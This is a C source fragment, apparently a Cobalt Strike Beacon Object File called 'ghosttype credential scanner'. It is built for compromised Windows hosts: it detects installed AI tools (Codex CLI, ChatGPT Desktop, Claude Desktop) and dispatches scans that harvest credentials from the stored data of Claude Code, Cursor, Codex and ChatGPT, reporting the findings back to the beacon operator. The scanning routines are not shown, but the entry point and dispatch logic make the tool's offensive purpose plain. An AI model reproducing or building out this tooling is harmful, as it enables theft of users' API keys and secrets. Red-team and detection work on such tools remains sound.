    wcat(p, MAX_FPATH, L"\\.codex", &pos);
    BeaconPrintf(CALLBACK_OUTPUT, "  Codex CLI:       %s\n",
                  dir_exists(p) ? "FOUND" : "not found");

    pos = 0;
    wcat(p, MAX_FPATH, localappdata, &pos);
    wcat(p, MAX_FPATH, L"\\com.openai.chat", &pos);
    int chatgpt = dir_exists(p);
    if (!chatgpt) {
        pos = 0;
        wcat(p, MAX_FPATH, appdata, &pos);
        wcat(p, MAX_FPATH, L"\\com.openai.chat", &pos);
        chatgpt = dir_exists(p);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "  ChatGPT Desktop: %s\n",
                  chatgpt ? "FOUND" : "not found");

    BeaconPrintf(CALLBACK_OUTPUT, "  Claude Desktop:  %s (stub)\n",
                  claude_desktop_available() ? "FOUND" : "not found");
}

/* ================================================================
 * Entry Point
 * ================================================================ */

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int cmd            = BeaconDataInt(&parser);
    int max_age_days   = BeaconDataInt(&parser);
    int redact         = BeaconDataInt(&parser);
    int min_confidence = BeaconDataInt(&parser);

    if (cmd == 5) {
        list_tools();
        return;
    }

    if (cmd < 0 || cmd > 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid command %d\n", cmd);
        return;
    }

    scan_ctx_t ctx;
    smemset(&ctx, 0, sizeof(ctx));
    ctx.max_age_days = max_age_days;
    ctx.redact = redact;
    ctx.high_only = (min_confidence == 1);

    if (max_age_days > 0) {
        FILETIME now_ft;
        KERNEL32$GetSystemTimeAsFileTime(&now_ft);
        ULARGE_INTEGER now;
        now.LowPart = now_ft.dwLowDateTime;
        now.HighPart = now_ft.dwHighDateTime;
        ctx.cutoff_ft = now.QuadPart - ((ULONGLONG)max_age_days * 24ULL * 3600ULL * 10000000ULL);
    }

    g_seen_pos = 0;
    smemset(g_seen, 0, SEEN_BUF_SIZE);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] ghosttype credential scanner starting\n");

    if (cmd == 0 || cmd == 1) scan_claude_code(&ctx);
    if (cmd == 0 || cmd == 2) scan_cursor(&ctx);
    if (cmd == 0 || cmd == 3) scan_codex(&ctx);
    if (cmd == 0 || cmd == 4) scan_chatgpt(&ctx);

    sqlite_unload();

    BeaconPrintf(CALLBACK_OUTPUT,
        "{\"summary\":true,\"files_scanned\":%d,\"findings\":%d}\n",
        ctx.files_scanned, ctx.findings);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done: %d files scanned, %d findings\n",
                  ctx.files_scanned, ctx.findings);
}
